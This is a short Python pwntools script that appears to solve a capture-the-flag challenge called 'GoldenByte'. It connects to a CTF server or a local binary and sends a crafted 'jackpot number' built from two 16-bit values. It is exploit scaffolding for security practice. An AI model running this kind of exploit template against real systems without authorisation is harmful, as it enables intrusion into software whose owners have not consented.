#!/usr/bin/env python3
from pwn import *

elf = ELF("./GoldenByte")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "ctf.mf.grsu.by"
port = 9074

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path],env={"FLAG_VAL":"TEST-TEST-TEST"})
r = start()

#========= exploit here ===================
low = -535 & 0xFFFF                     # 0xFDE9 (lower 16 bits)
high = (-0x4120) & 0xFFFF               # 0xBEE0 (higher 16 bits)
jackpot_number = (high << 16) | low     # 0xBEE0FDE9 

print("Jackpot number: {} ({})".format(jackpot_number,hex(jackpot_number)))

r.sendlineafter(b"> ", str(jackpot_number).encode())

r.interactive()

